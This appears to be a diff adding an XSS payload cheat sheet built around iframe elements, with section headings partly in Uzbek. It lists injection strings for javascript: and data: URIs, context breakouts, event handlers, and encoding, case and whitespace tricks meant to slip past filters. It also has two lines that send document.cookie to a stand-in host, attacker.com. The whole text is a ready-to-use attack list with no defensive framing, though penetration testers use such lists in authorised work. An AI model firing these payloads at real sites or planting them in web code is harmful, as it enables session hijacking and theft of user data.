@@ -1,0 +1,111 @@
+🔥 ULTIMATE IFRAME XSS (CLEAN)
+
+⸻
+
+1. CORE (ENG MUHIM)
+
+<iframe src=javascript:alert(1)></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src=javascript:alert(document.cookie)></iframe>
+
+
+⸻
+
+2. CONTEXT BREAKOUT
+
+"><iframe src=javascript:alert(1)></iframe>
+'><iframe src=javascript:alert(1)></iframe>
+"></iframe><script>alert(1)</script>
+
+
+⸻
+
+3. DATA URI (Juda kuchli)
+
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+
+
+⸻
+
+4. EVENT-BASED EXECUTION
+
+<iframe src=x onload=alert(1)></iframe>
+<iframe src=x onerror=alert(1)></iframe>
+<iframe onclick=alert(1)></iframe>
+
+
+⸻
+
+5. OBFUSCATION / BYPASS
+
+<iframe src=JaVaScRiPt:alert(1)></iframe>
+<iframe src=javascript&colon;alert(1)></iframe>
+<iframe src=j&#97;vascript:alert(1)></iframe>
+<iframe src=javascript:alert(String.fromCharCode(88,83,83))></iframe>
+
+
+⸻
+
+6. WHITESPACE / CONTROL BYPASS
+
+<iframe src="jav	ascript:alert(1)"></iframe>
+<iframe src="jav&#x09;ascript:alert(1)"></iframe>
+<iframe src=`%00`javascript:alert(1)></iframe>
+
+
+⸻
+
+7. ATTRIBUTE BYPASS
+
+<iframe/src=javascript:alert(1)>
+<iframe src=javascript:alert(1)//>
+<iframe src=javascript:alert(1) >
+
+
+⸻
+
+8. DOM / DATA EXFILTRATION
+
+<iframe src=javascript:fetch('//attacker.com?c='+document.cookie)></iframe>
+<iframe src=javascript:location='//attacker.com?c='+document.cookie></iframe>
+
+
+⸻
+
+9. POLYGLOT / PARSER ABUSE
+
+</title><iframe src=javascript:alert(1)>
+<iframe src="<svg onload=alert(1)>">
+
+
+⸻
+
+10. ENCODED
+
+%3Ciframe%20src%3Djavascript%3Aalert(1)%3E
+
+
+⸻
+
+11. ADVANCED JS EXECUTION
+
+<iframe src=javascript:eval('alert(1)')></iframe>
+<iframe src=javascript:new Function('alert(1)')()></iframe>
+<iframe src=javascript:setTimeout(alert,0,1)></iframe>
+
+
+⸻
+
+12. HYBRID (SVG + IFRAME)
+
+<iframe src="data:text/html,<svg onload=alert(1)>"></iframe>
+
+
+⸻
+
+13. RARE BUT USEFUL
+
+<iframe src=javascript:throw alert(1)></iframe>
+<iframe src=javascript:onerror=alert;throw 1></iframe>
